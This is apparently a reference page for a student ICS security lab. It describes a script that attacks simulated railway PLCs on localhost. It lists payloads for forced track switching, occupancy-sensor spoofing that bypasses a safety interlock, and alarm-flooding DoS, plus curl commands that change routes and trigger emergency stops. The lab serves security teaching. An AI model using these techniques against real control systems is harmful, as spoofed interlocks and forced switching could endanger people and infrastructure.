# Attack Script Reference: modbus-attack.py

## Overview
The `scripts/modbus-attack.py` file is the primary attack tool for this lab. It uses only Python standard libraries (no external packages required) and communicates with the PLC APIs over HTTP.

## Usage

```bash
python scripts/modbus-attack.py
```

## Available Attacks

### Option 1: Unauthorized Track Switching (Level 2 Attack)
- **Target:** Master PLC at `localhost:8085`
- **Endpoint:** `POST /api/command`
- **Payload:** `{"segment_id": 2, "route": "ROUTE_B"}`
- **Effect:** Forces Central Junction to switch to the Local Siding route
- **Purdue Level:** Level 2 (Control System) - attacker is on the supervisory network

### Option 2: Safety Interlock Bypass / Sensor Spoofing (Level 1 Attack)
- **Target:** Slave PLC 1 at `localhost:8086`
- **Endpoint:** `POST /api/device/set`
- **Payload:** `{"device": "Occupancy Segment 1", "value": false}`
- **Effect:** Spoofs the occupancy sensor to report "clear" regardless of actual train position
- **Purdue Level:** Level 1 (Field Devices) - attacker has direct access to field controllers

### Option 3: SCADA Alarm Flooding / DoS (Level 3 Attack)
- **Target:** Master PLC at `localhost:8085`
- **Endpoint:** `POST /api/command` (50 rapid requests)
- **Payload:** Alternating `ROUTE_A` and `ROUTE_B` on Segment 3
- **Effect:** Overwhelms the SCADA audit log with conflicting commands
- **Purdue Level:** Level 3 (Operations) - attacker disrupts the operator's situational awareness

## Writing Your Own Attacks

Students can craft custom API requests using `curl`:

```bash
# Read the full system status
curl http://localhost:8085/api/status

# Switch a track route
curl -X POST http://localhost:8085/api/command \
  -H "Content-Type: application/json" \
  -d '{"segment_id": 1, "route": "ROUTE_C"}'

# Trigger an emergency stop
curl -X POST http://localhost:8085/api/emergency \
  -H "Content-Type: application/json" \
  -d '{"reason": "Student CTF test"}'

# Clear the emergency
curl -X POST http://localhost:8085/api/emergency/clear
```
